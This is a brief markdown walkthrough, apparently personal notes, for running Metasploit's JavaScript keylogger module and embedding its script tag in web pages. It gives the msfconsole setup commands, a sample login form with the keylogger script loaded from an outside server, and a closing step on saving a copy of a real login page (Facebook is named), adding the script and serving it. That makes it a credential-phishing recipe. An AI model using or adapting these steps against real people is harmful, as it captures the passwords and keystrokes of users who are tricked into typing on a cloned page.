# Keylogging with Metasploit & Javascript

### Sources
[https://blog.rapid7.com/2012/02/21/metasploit-javascript-keylogger/](https://blog.rapid7.com/2012/02/21/metasploit-javascript-keylogger/)
[https://vulners.com/metasploit/MSF:AUXILIARY/SERVER/CAPTURE/HTTP_JAVASCRIPT_KEYLOGGER](https://vulners.com/metasploit/MSF:AUXILIARY/SERVER/CAPTURE/HTTP_JAVASCRIPT_KEYLOGGER)

### requirement
- raspberrypi 
- kali 
- metasploit

### Description
- ssh on remote pi 
	
```
ssh [USER]@[HOSTNAME] -p [PORT]
```
- run metasploit

```
msfconsole -q
use auxiliary/server/capture/http_javascript_keylogger
set demo true
set SRVPORT [SRVPORT]
set URIPATH keylog
options
run
```

- Open html demo page client side

```
http://[IP]:[SRVPORT]/keylog/demo
http://[HOSTNAME]:[SRVPORT]/keylog/demo
```
- (optional) add this line in custom html

```
<script type="text/javascript" src="http://[HOSTNAME]:[SRVPORT]/keylog/test.js"></script> 
```
example:

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
</head>
<body>
  <form action="/action_page.php">
    username:<br>
    <input type="text" name="username">
    <br>
    password:<br>
    <input type="text" name="password">
    <br><br>
    <input type="submit" value="Submit">
  </form> 
<script type="text/javascript" src="http://[HOSTNAME]:[SRVPORT]/keylog/test.js"></script>
</body>
</html>
```
- (optional) Use others' ui
	- Save page locally (i.e. facebook login page)
	- Add magic tag script (see above)
	- Serve the page or push online i.e `browser-sync start --server`